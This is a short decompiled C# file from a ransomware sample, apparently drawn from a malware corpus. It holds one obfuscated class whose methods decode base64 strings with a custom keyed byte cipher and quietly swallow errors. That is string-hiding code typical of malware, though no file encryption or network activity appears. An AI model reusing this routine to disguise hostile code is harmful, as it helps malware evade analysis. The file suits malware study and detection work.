// Decompiled with JetBrains decompiler
// Type: WOGVCL
// Assembly: new2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7D97D205-93EA-4722-A1E5-21E77DE843A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-30a4eb8393f203db2dc365b910e352cfc02ba6f80a0ccd316800296661747606.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;

public class WOGVCL
{
  public static string TGKKNH(string Input, string LXDQJDFC)
  {
    string str;
    try
    {
      str = Encoding.UTF8.GetString(WOGVCL.LYOMYGKK(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(LXDQJDFC)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static byte[] LYOMYGKK(byte[] Input, byte[] LXDQJDFC)
  {
    int num1 = (int) Input[checked (Input.Length - 1)];
    byte[] numArray1 = new byte[checked (Input.Length - 2 + 1)];
    short index1 = 0;
    byte[] numArray2;
    try
    {
      int num2 = checked (Input.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        if ((int) index1 >= LXDQJDFC.Length)
          index1 = (short) 0;
        if (index2 < checked (Input.Length - 1))
        {
          numArray1[index2] = Convert.ToByte(checked ((int) Input[index2] - unchecked (numArray1.Length % LXDQJDFC.Length) - (int) LXDQJDFC[(int) index1] + num1));
          checked { ++index1; }
        }
        checked { ++index2; }
      }
      numArray2 = numArray1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray2 = numArray1;
      ProjectData.ClearProjectError();
    }
    return numArray2;
  }
}
